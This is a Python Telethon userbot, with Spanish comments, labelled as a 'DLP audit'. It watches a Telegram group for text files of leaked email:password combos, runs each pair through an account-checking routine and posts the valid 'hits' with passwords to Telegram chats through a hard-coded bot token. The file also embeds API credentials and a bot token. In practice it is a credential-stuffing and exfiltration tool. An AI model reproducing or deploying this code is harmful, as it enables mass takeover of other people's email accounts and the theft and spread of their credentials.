import os
import sys
import time
import threading
import base64
import requests
from urllib.parse import urlparse

try:
    from telethon import TelegramClient, events
except ImportError:
    print("❌ Error: Telethon no está instalado. Ejecuta 'pip install telethon'")
    sys.exit(1)

# ══════════════════════════════════════════════════
# CONFIGURATION
# ══════════════════════════════════════════════════
# Credenciales del Usuario
API_ID = 23099503
API_HASH = "5980c7a831a590bd1e3b58648ce1e1e2"

# Session name (creates a polar_bot.session file to keep you logged in)
SESSION_NAME = "polar_bot"

# ── Render Deployment: Load session from env var if available ──
SESSION_B64 = os.environ.get("SESSION_B64", "")
if SESSION_B64:
    print("🔑 Cargando sesión desde variable de entorno SESSION_B64...")
    try:
        session_bytes = base64.b64decode(SESSION_B64)
        with open(f"{SESSION_NAME}.session", "wb") as sf:
            sf.write(session_bytes)
        print(f"✅ Sesión escrita en {SESSION_NAME}.session ({len(session_bytes)} bytes)")
    except Exception as e:
        print(f"⚠️ Error decodificando sesión: {e}")

DOWNLOAD_DIR = "incoming_targets"

if not os.path.exists(DOWNLOAD_DIR):
    os.makedirs(DOWNLOAD_DIR)

client = TelegramClient(SESSION_NAME, API_ID, API_HASH)


# =======================================================
# DLP SCANNER INTEGRATION
# =======================================================
class DummyQueue:
    def put(self, item):
        pass

def process_file_and_scan(file_path, target_notif_chat=None):
    print("📥 Archivo detectado. Iniciando Auditoría DLP automática...")
    hits_buffer = []
    
    # 1. Read file
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            creds_text = f.read()
    except Exception as e:
        print(f"❌ Error leyendo archivo: {e}")
        return
    
    # 2. Extract pairs
    raw_pairs = [line.strip() for line in creds_text.split('\n') if line.strip()]
    valid_creds = []
    for pair in raw_pairs:
        parts = pair.split(':')
        if len(parts) == 2:
            valid_creds.append(f"{parts[0]}:{parts[1]}")
    
    if not valid_creds:
        print("❌ Error: No se encontraron credenciales válidas.")
        return
        
    print(f"✅ Procesando {len(valid_creds)} objetivos en background...")
    
    # 3. Import and Trigger run_audit Headlessly
    sys.path.append(os.path.dirname(os.path.abspath(__file__)))
    try:
        from server import run_audit
    except ImportError as e:
        print(f"❌ Error importando DLP backend: {e}")
        return
        
    dummy_q = DummyQueue()
    
    for cred in valid_creds:
        email, pwd = cred.split(':', 1)
        try:
            # We pass multi_user=True and the hit_buffer
            run_audit(dummy_q, email.strip(), pwd.strip(), multi_user=True, hit_buffer=hits_buffer)
        except Exception as e:
            print(f"Error scanning {email}: {e}")
            
    print(f"🏁 Auditoría de {len(valid_creds)} objetivos finalizada.")

    # 4. Consolidated Reporting
    if hits_buffer:
        print(f"📦 Enviando reporte consolidado de {len(hits_buffer)} HITs...")
        send_consolidated_report(hits_buffer)
    else:
        print("✅ No se encontraron HITs en este lote.")

def send_consolidated_report(hits):
    # Group by category (Match)
    categories = {}
    for h in hits:
        cat = h['match']
        if cat not in categories: categories[cat] = []
        categories[cat].append(h)

    # 1. Create Summary Text
    summary_lines = ["📊 *REPORTE DE AUDITORÍA DLP* 📊", "━━━━━━━━━━━━━━━━━━"]
    for cat, items in categories.items():
        summary_lines.append(f"✅ *{cat}*: `{len(items)}` aciertos")
    summary_lines.append("\n📄 _Detalles completos en el archivo adjunto_")

    # 2. Create detailed TXT
    report_name = f"reporte_hits_{int(time.time())}.txt"
    report_path = os.path.join("incoming_targets", report_name)
    
    with open(report_path, "w", encoding="utf-8") as f:
        f.write("DLP AUDIT PRO - REPORTE DE HITS\n")
        f.write("="*40 + "\n\n")
        
        for cat, items in categories.items():
            f.write(f"[{cat}]\n")
            f.write("-" * 20 + "\n")
            for h in items:
                line = f"{h['email']}:{h['pass']} | Pais: {h['country']} | Msgs: {h['total']}\n"
                f.write(line)
            f.write("\n")

    # 3. Send to Telegram using the Bot Token
    # We use requests here to keep it simple and detached from Telethon's main loop if needed
    # but since this script is already a Telethon client, we could use client.send_file.
    # However, since process_file_and_scan runs in a Thread, we'll use requests to the Bot.
    
    token = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
    
    # We notify ALL unique chat_ids found in the hits
    target_chats = set([h['chat_id'] for h in hits])
    
    for cid in target_chats:
        try:
            # Send message
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                          json={"chat_id": cid, "text": "\n".join(summary_lines), "parse_mode": "Markdown"})
            
            # Send file
            with open(report_path, "rb") as f:
                requests.post(f"https://api.telegram.org/bot{token}/sendDocument",
                              data={"chat_id": cid},
                              files={"document": f})
        except Exception as e:
            print(f"Error enviando reporte bot: {e}")

def fire_and_forget_scan(file_path):
    # This runs in a background thread, far away from Telethon's asyncio loop
    try:
        process_file_and_scan(file_path, "me")
    except Exception as e:
        print(f"Crit Error in Scanner Thread: {e}")

# =======================================================
# TELEGRAM EVENTS
# =======================================================
# =======================================================
TARGET_GROUP = "" # We'll set this dynamically
FILTER_KEYWORD = "" # We'll allow the user to set a keyword (e.g., 'HOTMAIL HQ')

@client.on(events.NewMessage)
async def handler(event):
    if not TARGET_GROUP:
        return
        
    # We only care about the target group
    chat = await event.get_chat()
    try:
        chat_id_or_title = getattr(chat, 'title', str(chat.id))
    except:
        chat_id_or_title = str(chat.id)

    # Check if this chat matches the user's TARGET_GROUP string
    if TARGET_GROUP not in [str(chat.id), chat_id_or_title, getattr(chat, 'username', '')]:
        return

    # Filter Keyword Check
    if FILTER_KEYWORD:
        msg_text = getattr(event.message, 'message', '') or ''
        has_keyword_in_text = FILTER_KEYWORD.lower() in msg_text.lower()
    else:
        has_keyword_in_text = True 

    # Check if message has a document
    if event.message.document:
        doc = event.message.document
        mime = doc.mime_type
        # Telegram files usually have attributes where the filename is stored
        file_name = ""
        for attr in doc.attributes:
            if hasattr(attr, 'file_name'):
                file_name = attr.file_name
                break
                
        if mime == 'text/plain' or file_name.lower().endswith('.txt'):
            # Combine text and filename check for the filter
            if FILTER_KEYWORD and not (has_keyword_in_text or FILTER_KEYWORD.lower() in file_name.lower()):
                print(f"[-] Ignorando archivo '{file_name}' porque no contiene '{FILTER_KEYWORD}'")
                return
                
            print(f"[*] ¡Documento .txt detectado en {TARGET_GROUP}!")
            try:
                # Save to incoming_targets
                local_path = os.path.join(DOWNLOAD_DIR, f"{int(time.time())}_{file_name if file_name else 'lista.txt'}")
                print(f"    -> Descargando...")
                await client.download_media(event.message, file=local_path)
                print(f"    -> Guardado en {local_path}. Iniciando escáner...")
                
                # Run scanner in a separate thread to not block Telethon
                t = threading.Thread(target=fire_and_forget_scan, args=(local_path,))
                t.start()
            except Exception as e:
                print(f"Error descargando medio: {e}")

async def main():
    print("══════════════════════════════════════════════════")
    print("  👁️  TELETHON USERBOT LISTENER                   ")
    print("══════════════════════════════════════════════════")
    
    # Conectar sin prompts interactivos (especial para Render/servidores headless)
    await client.connect()
    
    if not await client.is_user_authorized():
        print("❌ La sesión NO es válida o expiró.")
        print("   Por favor vuelve a autenticarte localmente y actualiza SESSION_B64 en Render.")
        sys.exit(1)
    
    print("\n✅ ¡Sesión iniciada correctamente!")

    
    global TARGET_GROUP, FILTER_KEYWORD
    
    # Read from ENV VARS if available (for Render deployment), else fall back to input()
    TARGET_GROUP = os.environ.get("TARGET_GROUP", "").strip()
    if not TARGET_GROUP:
        TARGET_GROUP = input("2. Ingresa el Nombre/Link/ID del Grupo a monitorear: ").strip()
    
    # Extraer username si pusieron un link (ej. https://t.me/mi_grupo)
    if not TARGET_GROUP.replace('-','').isdigit():
        parsed = urlparse(TARGET_GROUP)
        if parsed.path and parsed.netloc:  # it's a real URL
            TARGET_GROUP = parsed.path.strip('/')
    
    FILTER_KEYWORD = os.environ.get("FILTER_KEYWORD", "").strip()
    if not FILTER_KEYWORD:
        FILTER_KEYWORD = input("3. (Opcional) Ingresa palabra clave para filtrar archivos (ej. HOTMAIL HQ): ").strip()
        
    print(f"\n📡 Escuchando 24/7 nuevos envíos .txt en: '{TARGET_GROUP}'")
    if FILTER_KEYWORD:
        print(f"🔍 FILTRO ACTIVO: Solo descargará archivos que digan '{FILTER_KEYWORD}'")
    print("Los HITS positivos se enviarán al Telegram de cada usuario registrado.")
    
    await client.run_until_disconnected()


import asyncio

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nSaliendo...")
